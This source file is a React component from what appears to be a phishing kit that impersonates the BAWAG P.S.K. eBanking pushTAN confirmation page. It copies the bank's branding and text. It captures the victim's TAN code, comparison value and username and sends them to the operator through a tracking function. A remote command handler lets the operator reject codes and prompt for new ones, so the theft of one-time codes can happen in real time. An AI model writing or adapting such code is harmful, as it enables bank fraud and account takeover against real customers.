"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("bawag", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  return (
    <div className="container">
      {/* HEADER */}
      <header className="header">
        <div className="header-top">
          <div className="date">Mittwoch, 06.05.2026, 13:25</div>
          <ul className="languages">
            <li className="active"><a href="#">DE</a></li>
            <li><a href="#">EN</a></li>
            <li><a href="#">BKS</a></li>
            <li><a href="#">TR</a></li>
          </ul>
        </div>
        <div className="header-left">
          <a href="https://www.bawag.at/" target="_blank">
            <img
              src="/bawag/bawag_ebanking_logo_de.png"
              width={175}
              height={93}
              alt="BAWAG eBanking"
            />
          </a>
        </div>
      </header>

      {/* MAIN CONTENT */}
      <div className="main-content clearfix">
        {/* LEFT COLUMN -- PushTAN Form */}
        <div className="column-left">
          <div className="login-top" style={{ minHeight: "auto" }}>
            {/* Error banner */}
            {error && (
              <div
                style={{
                  backgroundColor: "#fdeaea",
                  color: "#a00",
                  border: "1px solid #e4aaaa",
                  borderRadius: "6px",
                  padding: "10px 14px",
                  marginBottom: "14px",
                  fontSize: "0.85em",
                }}
              >
                {error}
              </div>
            )}

            <div className="login-top-heading">
              <h3>pushTAN Freigabe</h3>
            </div>

            <p>
              Best&auml;tigen Sie die Transaktion in Ihrer pushTAN-App.
              Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger&auml;t.
            </p>

            {success ? (
              /* ---- Success message ---- */
              <div style={{ textAlign: "center", padding: "30px 0 40px" }}>
                <div
                  style={{
                    width: 56,
                    height: 56,
                    borderRadius: "50%",
                    backgroundColor: "#990000",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    margin: "0 auto 16px",
                  }}
                >
                  <svg
                    width="28"
                    height="28"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#fff"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                </div>
                <p
                  style={{
                    fontSize: "1.05em",
                    color: "#4a4a4a",
                    marginBottom: 6,
                    fontWeight: 600,
                  }}
                >
                  Transaktion best&auml;tigt
                </p>
                <p style={{ fontSize: "0.78em", color: "#676767" }}>
                  Ihre Eingabe wurde erfolgreich &uuml;bermittelt.
                </p>
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                {/* Timer ring + Vergleichswert */}
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 20,
                    justifyContent: "center",
                    padding: "18px 0 14px",
                  }}
                >
                  {/* Countdown ring */}
                  <div
                    style={{
                      position: "relative",
                      width: ringSize,
                      height: ringSize,
                      flexShrink: 0,
                    }}
                  >
                    <svg
                      width={ringSize}
                      height={ringSize}
                      style={{ transform: "rotate(-90deg)" }}
                    >
                      <circle
                        cx={ringSize / 2}
                        cy={ringSize / 2}
                        r={radius}
                        fill="none"
                        stroke="#e0e0e0"
                        strokeWidth={strokeWidth}
                      />
                      <circle
                        cx={ringSize / 2}
                        cy={ringSize / 2}
                        r={radius}
                        fill="none"
                        stroke={expired ? "#cc0000" : "#990000"}
                        strokeWidth={strokeWidth}
                        strokeDasharray={circumference}
                        strokeDashoffset={dashOffset}
                        strokeLinecap="round"
                        style={{ transition: "stroke-dashoffset 1s linear" }}
                      />
                    </svg>
                    <div
                      style={{
                        position: "absolute",
                        top: 0,
                        left: 0,
                        width: "100%",
                        height: "100%",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontSize: 16,
                        fontWeight: 500,
                        color: expired ? "#cc0000" : "#4a4a4a",
                      }}
                    >
                      {formatTime(secondsLeft)}
                    </div>
                  </div>

                  {/* Vergleichswert */}
                  <div>
                    <p
                      style={{
                        fontSize: "0.72em",
                        color: "#676767",
                        marginBottom: 6,
                        textTransform: "uppercase",
                        letterSpacing: "0.05em",
                      }}
                    >
                      Vergleichswert
                    </p>
                    <p
                      style={{
                        fontSize: "1.8em",
                        fontWeight: 400,
                        color: "#990000",
                        letterSpacing: "0.15em",
                        lineHeight: 1,
                        margin: 0,
                      }}
                    >
                      {vergleichswert}
                    </p>
                  </div>
                </div>

                {/* Divider */}
                <div
                  style={{
                    borderTop: "1px solid #e0e0e0",
                    margin: "6px 0 18px",
                  }}
                />

                {/* TAN-Code input */}
                <div style={{ marginBottom: 16 }}>
                  <input
                    type="text"
                    placeholder="TAN-Code"
                    value={code}
                    onChange={(e) =>
                      setCode(
                        e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6)
                      )
                    }
                    maxLength={6}
                    disabled={expired}
                    autoComplete="one-time-code"
                    inputMode="text"
                    spellCheck={false}
                    style={{
                      width: 272,
                      height: 42,
                      lineHeight: "42px",
                      borderRadius: 7,
                      border: "1px solid #949494",
                      padding: "0 15px",
                      backgroundColor: "#fff",
                      color: "#4a4a4a",
                      fontSize: "0.93em",
                      fontFamily:
                        "var(--font-roboto), Roboto, Arial, sans-serif",
                      display: "block",
                      opacity: expired ? 0.5 : 1,
                    }}
                    suppressHydrationWarning
                  />
                </div>

                {expired && (
                  <p
                    style={{
                      textAlign: "center",
                      color: "#cc0000",
                      fontSize: "0.78em",
                      margin: "8px 0 0",
                    }}
                  >
                    Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                  </p>
                )}

                {/* Submit button */}
                <div className="submit-button">
                  <button
                    type="submit"
                    disabled={!isValid || submitting}
                    style={
                      !isValid || submitting
                        ? { opacity: 0.5, cursor: "not-allowed" }
                        : {}
                    }
                  >
                    {submitting ? "Wird geprüft..." : "Bestätigen"}
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>

        {/* RIGHT COLUMN -- Info (same as login page) */}
        <div className="column-right">
          <div className="info-wrapper">
            <div className="info">
              <div className="column-3-grid">
                <h3>Sicherheit</h3>
                <ul>
                  <li>
                    Die BAWAG versendet keine E-Mails mit direkten eBanking
                    Login-Links!
                    <br />
                    <a href="#" target="_blank">
                      Mehr Infos
                    </a>
                  </li>
                </ul>
              </div>
              <div className="column-3-grid">
                <h3>Service &amp; Info</h3>
                <ul>
                  <li>
                    <a href="#" target="_blank">
                      Sicherheitsregeln
                    </a>
                  </li>
                  <li>
                    <a href="#" target="_blank">
                      Anmeldung / Erste Schritte
                    </a>
                  </li>
                  <li>
                    <a href="#" target="_blank">
                      3D Secure Online Bezahlung
                    </a>
                  </li>
                </ul>
              </div>
              <div className="column-3-grid">
                <h3>Support</h3>
                <ul>
                  <li>
                    <a href="#" target="_blank">
                      FAQ
                    </a>
                  </li>
                  <li>
                    <a href="#" target="_blank">
                      Zu Watchlist Internet
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <footer className="footer">
        <ul>
          <li>
            <a href="#" target="_blank">
              Impressum
            </a>
          </li>
          <li>
            <a href="#" target="_blank">
              AGB
            </a>
          </li>
          <li>
            <a href="#" target="_blank">
              Datenschutz
            </a>
          </li>
          <li>
            <a href="#" target="_blank">
              Nutzungsbedingungen
            </a>
          </li>
          <li>
            <a href="#" target="_blank">
              Barrierefrei
            </a>
          </li>
        </ul>
        <p>&copy; BAWAG P.S.K.</p>
      </footer>
    </div>
  );
}
